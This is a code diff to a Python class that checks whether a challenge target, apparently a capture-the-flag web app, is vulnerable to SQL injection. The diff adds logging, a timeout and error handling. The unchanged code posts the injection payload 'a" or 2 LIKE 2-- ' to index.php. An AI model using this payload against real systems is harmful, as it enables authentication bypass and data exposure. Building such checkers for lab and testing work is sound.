@@ -21,17 +21,22 @@ class ChallengeFiveSQLi(Exploit):
 		Returns True if vulnerable and False if not
 		"""
 		try:
-			logger.info("Testing if the target is vulnerable to ChallengeFiveSQLi...")
+			logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeFiveSQLi...")
 			url = f"http://{self.ip_address}/index.php"
 			payload = {'codename_input': 'a" or 2 LIKE 2-- ', 'submitted': 'TRUE'}
-			server_response = requests.post(url, payload)
-			server_status_code = server_response.status_code
+			server_response = requests.post(url, payload, timeout=3)
 			server_response_text = server_response.text
 			if "FBI Headquarters" in server_response_text:
-				logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeFiveSQLi!{COLOR_END}")
+				logger.info(f"{COLOR_OKGREEN}{self.ip_address} - The target is vulnerable to ChallengeFiveSQLi!{COLOR_END}")
 				return True
-			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeFiveSQLi.{COLOR_END}")
+			logger.info(f"{COLOR_FAIL}{self.ip_address} - The target is not vulnerable to ChallengeFiveSQLi.{COLOR_END}")
 			return False
 		except PatchedException:
-			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeFiveSQLi.{COLOR_END}")
+			logger.info(f"{COLOR_FAIL}{self.ip_address} - The target is not vulnerable to ChallengeFiveSQLi.{COLOR_END}")
+			return False
+		except requests.ConnectTimeout:
+			logger.info(f"{COLOR_ORANGE}{self.ip_address} - The request timed out while checking if ChallengeFiveSQLi is vulnerable.{COLOR_END}")
+			return False
+		except Exception:
+			logger.info(f"{COLOR_ORANGE}{self.ip_address} - Something went wrong while checking if ChallengeFiveSQLi is vulnerable.{COLOR_END}")
 			return False
